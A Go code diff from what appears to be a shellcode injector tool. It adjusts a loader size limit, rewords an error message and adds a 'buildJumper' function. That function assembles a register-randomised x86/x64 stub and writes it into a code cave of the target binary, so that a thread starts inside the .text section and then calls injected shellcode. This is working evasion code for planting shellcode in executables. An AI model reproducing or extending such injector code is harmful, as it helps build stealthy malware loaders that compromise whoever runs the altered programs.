@@ -23,7 +23,7 @@ var _ embed.FS
 const numInstForCopyShellcode = 4
 
 const (
-	maxNumLoaderInstX86 = 350
+	maxNumLoaderInstX86 = 300
 	maxNumLoaderInstX64 = 250
 )
 
@@ -226,7 +226,7 @@ func (inj *Injector) buildLoaderASM(src string, shellcode []byte, ins bool) (str
 	buf := bytes.NewBuffer(make([]byte, 0, 512))
 	err = tpl.Execute(buf, ctx)
 	if err != nil {
-		return "", fmt.Errorf("failed to build assembly source: %s", err)
+		return "", fmt.Errorf("failed to build loader source: %s", err)
 	}
 	return buf.String(), nil
 }
@@ -455,6 +455,52 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 		}
 	}
 	return val, key
+}
+
+// buildJumper is used to try to find a code cave for store instructions about
+// a jumper to the shellcode, that the thread start address is in .text section.
+func (inj *Injector) buildJumper(ctx *loaderCtx) error {
+	if len(inj.caves) == 0 || inj.opts.NotCreateThread {
+		return nil
+	}
+	var src string
+	switch inj.arch {
+	case "386":
+		src = `
+            // read thread argument that stored the shellcode address
+            mov {{.Reg.eax}}, [esp+4]
+            call {{.Reg.eax}}
+            ret       `
+	case "amd64":
+		src = `
+            // read thread argument that stored the shellcode address
+            mov {{.Reg.rax}}, rcx
+            call {{.Reg.rax}}
+            ret       `
+	}
+	type jumperCtx struct {
+		Reg map[string]string
+	}
+	jmpCtx := &jumperCtx{
+		Reg: inj.buildRandomRegisterMap(),
+	}
+	// process loader template and assemble it
+	tpl, err := template.New("jumper").Parse(src)
+	if err != nil {
+		return fmt.Errorf("invalid jumper template: %s", err)
+	}
+	buf := bytes.NewBuffer(make([]byte, 0, 512))
+	err = tpl.Execute(buf, jmpCtx)
+	if err != nil {
+		return fmt.Errorf("failed to build jumper source: %s", err)
+	}
+	inst, err := inj.assemble(buf.String())
+	if err != nil {
+		return fmt.Errorf("failed to assemble jumper: %s", err)
+	}
+	cave := inj.selectCodeCave()
+	cave.Write(inj.dup, inst)
+	return nil
 }
 
 func (inj *Injector) buildLoaderSource(ctx *loaderCtx, sc []byte, src string) (string, error) {
